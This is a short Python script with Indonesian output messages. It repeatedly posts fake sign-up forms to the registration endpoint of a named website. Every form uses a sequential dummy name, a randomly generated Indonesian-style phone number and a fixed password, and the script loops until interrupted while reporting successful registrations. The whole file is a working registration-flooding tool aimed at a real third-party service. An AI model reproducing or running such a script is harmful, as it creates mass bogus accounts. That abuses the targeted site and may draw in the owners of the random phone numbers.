import requests
import random
from bs4 import BeautifulSoup

url_post = "https://member.jerkrose.com/auth/register"
x = True
text_success = "Berhasil"
i = 1

try:
    while x:
        i = i + 1
        num = "085" + ''.join(str(random.randint(1, 9)) for _ in range(9))
        form_data = {
            "name": "Mr xxx" + str(i),
            "phone": num,
            "password1": "xxxxxxxx",
            "password2": "xxxxxxxx",
        }
        res = requests.post(url_post, form_data)
        if text_success in res.text:
            soup = BeautifulSoup(res.text, 'html.parser')
            alert_div = soup.find('div', class_='alert alert-success alert-dismissible fade show')
            if alert_div:
                alert_message = alert_div.get_text(strip=True)
                print(alert_message + " ke : " + str(i))
            else:
                print("Pesan tidak ditemukan.")
            # print(res.text)
        else:
            print('Gagal!' + " ke : " + str(i))
except KeyboardInterrupt:
    print('Bye!')
    x = False
